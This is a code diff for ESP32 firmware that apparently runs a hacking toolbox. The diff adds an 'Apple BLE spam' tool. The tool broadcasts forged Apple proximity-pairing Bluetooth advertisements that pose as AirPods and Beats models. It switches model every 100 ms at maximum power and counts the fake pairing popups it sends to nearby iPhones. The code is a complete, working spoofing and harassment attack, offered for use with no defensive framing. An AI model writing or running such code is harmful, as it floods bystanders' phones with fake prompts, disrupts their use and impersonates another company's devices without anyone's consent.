@@ -805,6 +805,103 @@ static void drawBleScan(TFT_eSPI& t, uint32_t now) {
 }
 
 // =============================================================================
+//  APPLE BLE SPAM — fake proximity pairing popups on iPhones
+// =============================================================================
+static NimBLEAdvertising* s_pAdv = nullptr;
+static uint32_t s_appleSpamCount = 0;
+static uint32_t s_appleSpamLastMs = 0;
+static int s_appleDevIdx = 0;
+
+// Apple proximity pairing device types (manufacturer data prefix after 0x4C 0x00)
+// Format: length, type 0x07 (proximity pair), device model bytes
+static const uint8_t APPLE_DEVICES[][4] = {
+    {0x07, 0x19, 0x07, 0x14},  // AirPods Pro
+    {0x07, 0x19, 0x07, 0x02},  // AirPods
+    {0x07, 0x19, 0x07, 0x0E},  // AirPods Pro 2
+    {0x07, 0x19, 0x07, 0x0A},  // AirPods Max
+    {0x07, 0x19, 0x07, 0x06},  // Beats Solo Pro
+    {0x07, 0x19, 0x07, 0x10},  // Beats Fit Pro
+    {0x07, 0x19, 0x07, 0x05},  // Beats X
+    {0x07, 0x19, 0x07, 0x03},  // Powerbeats 3
+};
+static const char* APPLE_NAMES[] = {
+    "AirPods Pro", "AirPods", "AirPods Pro 2", "AirPods Max",
+    "Beats Solo Pro", "Beats Fit Pro", "Beats X", "Powerbeats 3"
+};
+static const int APPLE_DEV_COUNT = 8;
+
+static void appleSpamStart() {
+    s_appleSpamCount = 0;
+    s_appleSpamLastMs = 0;
+    s_appleDevIdx = 0;
+    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
+    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+    s_pAdv = NimBLEDevice::getAdvertising();
+    Serial.println("[toolbox] Apple BLE spam started");
+}
+
+static void appleSpamTick() {
+    uint32_t now = millis();
+    if (now - s_appleSpamLastMs < 100) return;  // switch device every 100ms
+    s_appleSpamLastMs = now;
+
+    s_pAdv->stop();
+
+    // Build Apple manufacturer data
+    // Company ID 0x004C (Apple) + proximity pairing data
+    uint8_t mfgData[16];
+    mfgData[0] = 0x4C; mfgData[1] = 0x00;  // Apple company ID (little-endian)
+    // Copy device type bytes
+    memcpy(mfgData + 2, APPLE_DEVICES[s_appleDevIdx], 4);
+    // Random status bytes
+    mfgData[6] = random(0, 256);
+    mfgData[7] = random(0, 256);
+    mfgData[8] = 0x00;
+
+    NimBLEAdvertisementData advData;
+    advData.setFlags(0x06);  // general discoverable + BR/EDR not supported
+    advData.setManufacturerData(std::string((char*)mfgData, 9));
+
+    s_pAdv->setAdvertisementData(advData);
+    s_pAdv->start();
+
+    s_appleDevIdx = (s_appleDevIdx + 1) % APPLE_DEV_COUNT;
+    s_appleSpamCount++;
+}
+
+static void drawAppleSpam(TFT_eSPI& t, uint32_t now) {
+    const int w = t.width();
+    const int h = t.height();
+
+    appleSpamTick();
+
+    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("APPLE BLE SPAM", w / 2, HEADER_H + 20, 4);
+
+    // Show cycling device names
+    t.setTextDatum(TL_DATUM);
+    int listY = HEADER_H + 50;
+    for (int i = 0; i < APPLE_DEV_COUNT; i++) {
+        uint16_t col = (i == s_appleDevIdx) ? Theme::VAPOR_YELLOW : Theme::CYAN;
+        t.setTextColor(col, Theme::BG);
+        t.drawString(APPLE_NAMES[i], 12, listY + i * 20, 2);
+    }
+
+    char buf[32];
+    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_appleSpamCount);
+    t.setTextColor(Theme::GREEN, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString(buf, w / 2, h - 65, 6);
+    t.setTextColor(Theme::AMBER, Theme::BG);
+    t.drawString("popups sent", w / 2, h - 35, 2);
+
+    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
+    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
+}
+
+// =============================================================================
 //  Tool stop / cleanup
 // =============================================================================
 static void stopActiveTool() {
@@ -830,6 +927,9 @@ static void stopActiveTool() {
         case ActiveTool::BLE_SCAN:
             if (s_pBLEScan && s_pBLEScan->isScanning()) s_pBLEScan->stop();
             break;
+        case ActiveTool::APPLE_SPAM:
+            if (s_pAdv) { s_pAdv->stop(); s_pAdv = nullptr; }
+            break;
         default: break;
     }
     s_activeTool = ActiveTool::NONE;
@@ -853,6 +953,7 @@ static void launchTool(ActiveTool tool) {
         case ActiveTool::RICKROLL:    rickrollStart();    break;
         case ActiveTool::PROBE_SNIFF: probeSniffStart();  break;
         case ActiveTool::BLE_SCAN:    bleScanStart();     break;
+        case ActiveTool::APPLE_SPAM:  appleSpamStart();   break;
         default: break;
     }
 }
@@ -906,6 +1007,7 @@ static const char* headerForLevel(ToolboxLevel lvl) {
                 case ActiveTool::CLONE_AP:    return "CLONE AP";
                 case ActiveTool::PROBE_SNIFF: return "PROBE SNIFF";
                 case ActiveTool::BLE_SCAN:    return "BLE SCAN";
+                case ActiveTool::APPLE_SPAM:  return "APPLE SPAM";
                 default:                      return "RUNNING...";
             }
         default: return "TOOLBOX";
@@ -1152,6 +1254,7 @@ void uiToolboxTick(TFT_eSPI& t, uint32_t now) {
             case ActiveTool::CLONE_AP:    drawCloneAp(t, now);    break;
             case ActiveTool::PROBE_SNIFF: drawProbeSniff(t, now); break;
             case ActiveTool::BLE_SCAN:    drawBleScan(t, now);    break;
+            case ActiveTool::APPLE_SPAM:  drawAppleSpam(t, now);  break;
             default:
                 t.setTextColor(Theme::CYAN, Theme::BG);
                 t.setTextDatum(MC_DATUM);
@@ -1221,6 +1324,7 @@ static bool handleBleTap(int idx) {
     if ((BleTool)idx == BleTool::BACK) { s_level = ToolboxLevel::CATEGORIES; s_scroll = 0; return true; }
     switch ((BleTool)idx) {
         case BleTool::SCAN_DEVICES: launchTool(ActiveTool::BLE_SCAN); break;
+        case BleTool::APPLE_SPAM:   launchTool(ActiveTool::APPLE_SPAM); break;
         default:
             s_toolActive = true;
             s_activeTool = ActiveTool::NONE;
